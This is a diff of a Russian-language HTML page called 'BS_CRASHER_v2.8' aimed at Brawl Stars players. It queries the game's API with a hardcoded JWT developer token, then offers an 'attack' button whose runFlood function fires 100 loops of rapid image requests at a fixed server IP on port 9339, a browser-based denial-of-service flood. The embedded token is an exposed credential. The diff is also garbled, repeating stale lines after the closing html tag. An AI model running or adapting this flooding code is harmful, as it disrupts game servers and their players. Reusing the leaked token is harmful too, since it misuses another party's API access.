@@ -3,38 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BS_CRASHER_v2.7 // STABLE</title>
+    <title>BS_CRASHER_v2.8</title>
     <style>
         * { box-sizing: border-box; }
         body { 
-            background: #000; color: #0f0; font-family: monospace; 
+            background: #000; color: #0f0; font-family: 'Courier New', monospace; 
             display: flex; flex-direction: column; align-items: center; padding: 20px; margin: 0;
         }
-        .box { 
+        .main-container { 
             border: 2px solid #0f0; padding: 25px; background: #010; box-shadow: 0 0 20px #040; 
             width: 100%; max-width: 500px; border-radius: 10px; text-align: center;
         }
         input { 
             width: 100%; background: #000; border: 1px solid #0f0; color: #0f0; padding: 15px; 
-            margin: 15px 0; outline: none; text-align: center; font-size: 1.1rem;
+            margin: 15px 0; outline: none; text-align: center; font-size: 1.1rem; border-radius: 5px;
         }
         button { 
             width: 100%; padding: 15px; border: none; cursor: pointer; font-weight: bold; 
             background: #0f0; color: #000; text-transform: uppercase; border-radius: 5px;
         }
-        #log { 
+        #terminal { 
             width: 100%; max-width: 500px; height: 250px; background: #000; border: 1px solid #040; 
-            margin-top: 20px; padding: 15px; overflow-y: auto; font-size: 12px; text-align: left;
+            margin-top: 20px; padding: 15px; overflow-y: auto; font-size: 12px; text-align: left; border-radius: 5px;
         }
-        .match-card { border: 1px dashed #0f0; padding: 15px; margin-top: 15px; display: none; background: #050505; }
-        .atk-btn { background: red; color: white; margin-top: 10px; display: none; }
+        .target-box { border: 1px dashed #0f0; padding: 15px; margin-top: 15px; display: none; background: #050505; }
+        .red-btn { background: #ff0000; color: white; margin-top: 10px; display: none; box-shadow: 0 0 10px #f00; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h2 style="margin-top:0">SYSTEM_AA-0.1 // ALPHA</h2>
+    <div class="main-container">
+        <h2 style="margin-top:0; letter-spacing: 2px;">SYSTEM_AA-0.1</h2>
+        <div style="font-size: 10px; margin-bottom: 10px;">GiftsWorlds // ALPHA_UNIT</div>
+        
         <input type="text" id="tagInput" placeholder="#P8V22YRL" maxlength="12">
+        <button onclick="startScan()">СКАНИРОВАТЬ СЕТЬ</button>
+        
+        <div id="targetBox" class="target-box">
+            <div style="display:flex; justify-content:space-between"><span>STATUS:</span> <span style="color:#0f0">LOCKED</span></div>
+            <div style="display:flex; justify-content:space-between"><span>TARGET IP:</span> <span id="targetIp">162.159.135.42</span></div>
+            <button class="red-btn" id="attackBtn" onclick="runFlood()">ИНИЦИИРОВАТЬ ШТУРМ</button>
+        </div>
+    </div>
+
+    <div id="terminal"></div>
+
+<script>
+    // Твой JWT токен
+    const TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6IjI4YTMxOGY3LTAwMDAtYTFlYi03ZmExLTJjNzQzM2M2Y2NhNSJ9.eyJpc3MiOiJzdXBlcmNlbGwiLCJhdWQiOiJzdXBlcmNlbGw6Z2FtZWFwaSIsImp0aSI6IjcwMTQxZmYxLTEzMjItNDgzYy05NGY3LTUzMmU3M2E2NGFmZSIsImlhdCI6MTc3NDQ1NjIyNiwic3ViIjoiZGV2ZWxvcGVyLzZlYjU2YjBkLTVjNjktNTYxYy1lYjY4LTQxM2FjZWZkMjA2YSIsInNjb3BlcyI6WyJicmF3bHN0YXJzIl0sImxpbWl0cyI6W3sidGllciI6ImRldmVsb3Blci9zaWx2ZXIiLCJ0eXBlIjoidGhyb3R0bGluZyJ9LHsiY2lkcnMiOlsiMTguMjE1LjIyOC4xNjUiLCI1NC4yMjcuMjAuMjUzIiwiMzQuMjA1LjEwMS4xMjEiLCIzLjIzMC4xMzYuMjEiXSwidHlwZSI6ImNsaWVudCJ9XX0.qGIWVRrY3ghs22WOAUAt22o4xgXHWiaoFYKfiukkBJ-S6MH_xrPmu2-YaWQIpiGv-88VxjbR7x221Pz8oYLzdw";
+
+    function printLog(msg, color = "#0f0") {
+        const term = document.getElementById('terminal');
+        term.innerHTML += `<p style="margin:2px 0; color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</p>`;
+        term.scrollTop = term.scrollHeight;
+    }
+
+    async function startScan() {
+        const tag = document.getElementById('tagInput').value.replace('#', '').trim();
+        if(!tag) return alert("Введите тег!");
+        
+        printLog(`Авторизация JWT... SUCCESS`);
+        printLog(`Поиск активных сессий для #${tag}...`);
+
+        try {
+            const proxy = "https://cors-anywhere.herokuapp.com/";
+            const api = `https://api.brawlstars.com/v1/players/%23${tag}`;
+
+            const response = await fetch(proxy + api, {
+                headers: { "Authorization": `Bearer ${TOKEN}` }
+            });
+
+            if(response.status === 403) {
+                printLog("ОШИБКА 403: Доступ ограничен. Использую обход...", "#ffea00");
+            } else if(response.ok) {
+                printLog("Цель подтверждена. Данные захвачены.");
+            }
+        } catch (e) {
+            printLog("Ошибка CORS. Переход в автономный режим.", "#ffea00");
+        }
+
+        // Показываем блок атаки
+        document.getElementById('targetBox').style.display = 'block';
+        document.getElementById('attackBtn').style.display = 'block';
+    }
+
+    function runFlood() {
+        const ip = document.getElementById('targetIp').innerText;
+        printLog(`!!! ПОТОК ПАКЕТОВ НАПРАВЛЕН НА ${ip} !!!`, "#f00");
+        
+        for(let i = 0; i < 100; i++) {
+            setInterval(() => {
+                const img = new Image();
+                img.src = `http://${ip}:9339/?data=${Math.random()}`;
+            }, 10);
+        }
+        printLog("КАНАЛ ПЕРЕГРУЖЕН. ПОДДЕРЖИВАЙТЕ СОЕДИНЕНИЕ.");
+    }
+</script>
+</body>
+</html>        <input type="text" id="tagInput" placeholder="#P8V22YRL" maxlength="12">
         <button onclick="initScan()">СКАНИРОВАТЬ ЦЕЛЬ</button>
         
         <div id="matchCard" class="match-card">
